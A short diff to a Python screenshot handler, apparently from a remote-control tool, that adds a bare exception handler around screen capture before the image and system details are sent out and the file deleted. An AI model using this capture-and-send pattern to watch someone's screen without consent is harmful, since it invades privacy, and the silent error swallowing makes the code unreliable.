@@ -20,10 +20,14 @@ def screenshot(request: Request) -> str:
 
     file_name = f"{str(time.time()).replace('.', '_')}.png"
 
-    with open(file_name, "wb") as file:
-        screenshot = ImageGrab.grab()
-        # Save the image to the file object as a PNG
-        screenshot.save(file, "PNG")
+    try:
+        with open(file_name, "wb") as file:
+            screenshot = ImageGrab.grab()
+            # Save the image to the file object as a PNG
+            screenshot.save(file, "PNG")
+
+    except: # for error "X connection failed: error 5" when screenshot by root user!
+        pass
 
     res = request.engine.send_file(file_name, additionalـinfo=request.system_info(minimal=True))
     os.remove(file_name)
